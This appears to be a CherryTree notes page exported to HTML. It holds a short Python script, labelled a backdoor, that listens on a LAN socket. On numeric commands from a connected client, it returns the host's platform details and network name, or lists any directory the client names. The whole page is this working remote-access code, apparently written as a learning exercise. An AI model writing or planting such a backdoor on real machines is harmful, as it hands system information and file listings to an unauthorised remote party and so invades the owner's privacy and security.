<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Backdoor: listen for client commands</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Backdoor: listen for client commands</h1><br/><div class="codebox"><div class="codebox">#!/usr/bin/env&nbsp;python3<br /><br />import&nbsp;socket,&nbsp;platform,&nbsp;os<br /><br />SERVER_ADDRESS&nbsp;=&nbsp;&quot;192.168.1.29&quot;&nbsp;&nbsp;#&nbsp;address&nbsp;of&nbsp;this&nbsp;server&nbsp;127.0.0.1&nbsp;<br />SERVER_PORT&nbsp;=&nbsp;65432&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Port&nbsp;to&nbsp;listen&nbsp;on&nbsp;(non-privileged&nbsp;ports&nbsp;are&nbsp;&gt;&nbsp;1023)<br /><br />s=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)<br />s.bind((SERVER_ADDRESS,&nbsp;SERVER_PORT))<br />s.listen(1)&nbsp;&nbsp;&nbsp;#argument&nbsp;1&nbsp;specifies&nbsp;the&nbsp;maximum&nbsp;number&nbsp;of&nbsp;queued&nbsp;connections<br />print(&quot;server&nbsp;started&nbsp;wainting&nbsp;for&nbsp;connection...&nbsp;&quot;)<br />connection,&nbsp;address&nbsp;=&nbsp;s.accept()<br />print(&quot;client&nbsp;connected&nbsp;with&nbsp;address&quot;,&nbsp;address)<br />while&nbsp;True:<br />&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;connection.recv(1024)<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(data.decode(&quot;utf-8&quot;)==&quot;1&quot;):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system_info=platform.platform()+&quot;;\nmachine&nbsp;type:&nbsp;&quot;+platform.machine()+&quot;;\ncomputerâ€™s&nbsp;network&nbsp;name:&nbsp;&quot;+platform.node()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;connection.sendall(system_info.encode())<br />&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;(data.decode(&quot;utf-8&quot;)==&quot;2&quot;):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;path&nbsp;=&nbsp;connection.recv(1024)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;list_of_file=os.listdir(path.decode(&quot;utf-8&quot;))&nbsp;#directory&nbsp;of&nbsp;the&nbsp;typed&nbsp;path<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_os=&quot;***&quot;.join(list_of_file)&nbsp;#convert&nbsp;a&nbsp;list&nbsp;to&nbsp;string&nbsp;separated&nbsp;by&nbsp;***<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_os=&quot;Wrong&nbsp;path&nbsp;:(&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;connection.sendall(file_os.encode())<br />&nbsp;&nbsp;&nbsp;&nbsp;elif(data.decode(&quot;utf-8&quot;)==&quot;0&quot;):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;connection.close()<br /><br /></div></div></div>
</body>
</html>
